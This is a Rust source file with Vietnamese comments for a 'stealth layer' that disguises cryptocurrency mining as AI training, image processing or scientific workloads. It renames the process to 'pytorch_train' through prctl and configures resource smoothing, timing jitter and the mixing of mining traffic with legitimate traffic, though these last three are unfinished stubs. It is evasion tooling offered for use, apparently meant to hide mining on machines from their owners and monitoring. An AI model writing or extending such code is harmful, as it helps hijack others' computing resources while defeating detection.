//! # Stealth Layer Library (Thư viện lớp ẩn danh)
//!
//! **Disguise mining operations** (ngụy trang hoạt động khai thác) dưới các
//! **legitimate workloads** (khối công việc hợp pháp) như AI Training, Image Processing,
//! Scientific Computing, và AI Inference.

pub mod config;
pub mod profile_manager;
pub mod wrappers;
pub mod resource_camouflage;
pub mod anti_detection;

// Re-export main types và functions
pub use config::{StealthConfig, load_config};
pub use profile_manager::ProfileManager;

/// Create stealth manager với default configuration
pub fn create_stealth_manager() -> Result<ProfileManager> {
    let config = load_config()?;
    ProfileManager::new(config)
}

/// Create stealth manager with default configuration (mutable version for tests)
pub fn create_stealth_manager_mut() -> ProfileManager {
    let config = StealthConfig::default();
    ProfileManager::new(config).unwrap()
}

/// Legacy compatibility types kept for backward compatibility
use serde::{Deserialize, Serialize};
use tracing::{info, debug};
use anyhow::Result;

/// **StealthProfile** (hồ sơ ẩn danh) – loại ngụy trang (legacy enum for compatibility)
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum StealthProfileLegacy {
    /// **AI Training** (đào tạo AI) – giả lập huấn luyện mô hình
    AiTraining,

    /// **Image Processing** (xử lý hình ảnh) – giả lập chỉnh sửa ảnh
    ImageProcessing,

    /// **Scientific Computing** (tính toán khoa học) – giả lập mô phỏng
    ScientificComputing,

    /// **AI Inference** (suy luận AI) – giả lập dự đoán mô hình
    AiInference,
}

/// **StealthConfig** (cấu hình ẩn danh) – thiết lập ngụy trang (legacy for compatibility)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealthConfigLegacy {
    /// **Profile** (hồ sơ) – loại ngụy trang sử dụng
    pub profile: StealthProfileLegacy,

    /// **Process name** (tên tiến trình) – tên hiển thị trong ps/top
    pub process_name: String,

    /// **Resource smoothing** (làm mịn tài nguyên) – bật/tắt GPU usage smoother
    pub enable_resource_smoothing: bool,

    /// **Timing jitter** (nhiễu thời gian) – thêm delay ngẫu nhiên
    pub enable_timing_jitter: bool,

    /// **Network mixing** (trộn mạng) – che giấu traffic pattern
    pub enable_network_mixing: bool,
}

impl Default for StealthConfigLegacy {
    fn default() -> Self {
        Self {
            profile: StealthProfileLegacy::AiTraining,
            process_name: "pytorch_train".to_string(),
            enable_resource_smoothing: true,
            enable_timing_jitter: true,
            enable_network_mixing: true,
        }
    }
}

/// **StealthManager** (trình quản lý ẩn danh) – điều phối ngụy trang (legacy compatibility)
pub struct StealthManagerLegacy {
    config: StealthConfigLegacy,
}

impl StealthManagerLegacy {
    /// **Create new stealth manager** (tạo trình quản lý mới)
    pub fn new(config: StealthConfigLegacy) -> Result<Self> {
        info!("🥷 Initializing stealth layer with profile: {:?}", config.profile);
        Ok(Self { config })
    }

    /// **Activate stealth** (kích hoạt ẩn danh) – bắt đầu ngụy trang
    pub async fn activate(&self) -> Result<()> {
        info!("🎭 Activating stealth profile: {:?}", self.config.profile);

        // Change process name (đổi tên tiến trình)
        self.change_process_name()?;

        // Start resource smoothing (bắt đầu làm mịn tài nguyên)
        if self.config.enable_resource_smoothing {
            debug!("📊 Enabling resource smoothing");
            // TODO: Start GPU usage smoother
        }

        // Start timing jitter (bắt đầu nhiễu thời gian)
        if self.config.enable_timing_jitter {
            debug!("⏱️ Enabling timing jitter");
            // TODO: Add random delays to operations
        }

        // Start network mixing (bắt đầu trộn mạng)
        if self.config.enable_network_mixing {
            debug!("🌐 Enabling network traffic mixing");
            // TODO: Mix mining traffic with legitimate traffic
        }

        info!("✅ Stealth layer activated successfully");
        Ok(())
    }

    /// **Deactivate stealth** (hủy kích hoạt ẩn danh) – tắt ngụy trang
    pub async fn deactivate(&self) -> Result<()> {
        info!("🛑 Deactivating stealth layer");

        // Stop all stealth mechanisms (dừng tất cả cơ chế ẩn danh)
        // TODO: Cleanup stealth resources

        info!("✅ Stealth layer deactivated");
        Ok(())
    }

    /// **Change process name** (đổi tên tiến trình) – hiển thị tên giả
    fn change_process_name(&self) -> Result<()> {
        use std::ffi::CString;

        debug!("🔧 Changing process name to: {}", self.config.process_name);

        // Linux: prctl(PR_SET_NAME, name)
        #[cfg(target_os = "linux")]
        {
            let name = CString::new(self.config.process_name.clone())?;
            unsafe {
                libc::prctl(
                    libc::PR_SET_NAME,
                    name.as_ptr() as libc::c_ulong,
                    0,
                    0,
                    0,
                );
            }
        }

        debug!("✅ Process name changed successfully");
        Ok(())
    }

    /// **Get current profile** (lấy hồ sơ hiện tại)
    pub fn profile(&self) -> StealthProfileLegacy {
        self.config.profile
    }
}

// Tests for ProfileManager and new config are in respective modules
